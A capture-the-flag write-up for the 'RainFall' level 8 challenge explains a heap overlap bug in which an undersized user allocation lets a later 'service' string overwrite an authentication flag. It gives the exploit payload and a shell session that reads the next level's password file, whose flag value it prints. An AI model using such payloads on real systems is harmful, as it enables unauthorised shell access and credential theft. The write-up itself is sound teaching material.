# Level 8

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct s_user {
    int id;
    char login[28];
    int is_auth;
};

int *service;
struct s_user *user;

int main()
{
    while (1)
    {
        printf("%p, %p \n", user, service);

        char buf[128];

        if (!(fgets(buf, 128, stdin)))
            break;

        if (!(strncmp(buf, "auth ", 5)))
        {
            user = malloc(4);
            user->id = 0;

            if (strlen(buf + 5) <= 30)
                strcpy(user, buf + 5);
        }

        if (!(strncmp(buf, "reset", 5)))
            free(user);

        if (!(strncmp(buf, "service", 6)))
            service = strdup(buf + 7);

        if (!(strncmp(buf, "login", 5)))
        {
            if (user->is_auth)
                system("/bin/sh");
            else
                fwrite("Password:\n", 1, 10, stdout);
        }
    }
    return 0;
}
```

Let's focus on the `main` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. Different commands are then executed based on the input:
- `auth`: Allocates a user structure and copies the input into it.
- `reset`: Frees the user structure.
- `service`: Copies the input into the service buffer.
- `login`: Checks if the user is authenticated and, if so, grants shell access.

We notice that the `auth` doesn't allocate enough memory for the user structure, which is 36 bytes long (4 bytes for the id, 28 bytes for the login and 4 bytes for the `is_auth` field). This means that, with the `service` command, we can write to the user structure, since it will be allocated within the same memory space, and overwrite the `is_auth` field to gain shell access.

Here's the following steps to perform the exploit:
1. Use `auth` to allocate the user structure.
2. Use `service` to write in the user structure and overwrite `is_auth`
3. Execute `login` to verify authentication and obtain a shell.

We'll use `ltrace` to understand the memory allocations and calculate the size needed to overwrite `is_auth`:
```bash
$ ltrace ./level8
[...]
fgets(auth
"auth \n", 128, 0xb7fd1ac0) = 0xbffff6d0
malloc(4) = 0x0804a008
strcpy(0x0804a008, "\n") = 0x0804a008 # user
[...]
fgets(service
"service\n", 128, 0xb7fd1ac0) = 0xbffff6d0
strdup("\n") = 0x0804a018 # service
[...]
level8@RainFall:~$
```

We notice that the user structure is allocated at `0x0804a008` for only 4 bytes, which is not enough to store the whole structure that is 36 bytes long. Furthermore, we also notice that the service buffer is allocated at `0x0804a018` (so within the same memory space as the user structure, since it is located between `0x0804a008` and `0x0804a028`). Moreover, we notice that the `is_auth` field is located at the 32nd byte of the user structure.  
So let's simply calculate the offset needed to reach `is_auth`:
```
0x0804a018 - 0x0804a008 = 0x10 (16 in decimal)
32 - 16 = 16 bytes of padding
```

We subtract 32 from 16 because the `service` buffer was already allocated 16 bytes after the user structure. So we'll have to write 16 bytes of padding to reach `is_auth`. Anything written after that will overwrite `is_auth`.

Let's craft our payload:
```
"auth "
"service" + padding
"login"

"auth \n" + "service" + "\x90"*16 + "\n" + "login\n"
```

The `\n` are needed to simulate the user pressing the enter key, and it will also serve as the 17th character needed to overwrite `is_auth`.

Let's run our payload:
```bash
level8@RainFall:~$ (echo "auth "; python -c 'print("service" + "\x90"*16)'; echo "login"; cat) | ./level8
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

We are now level9! Let's move on to the next level.
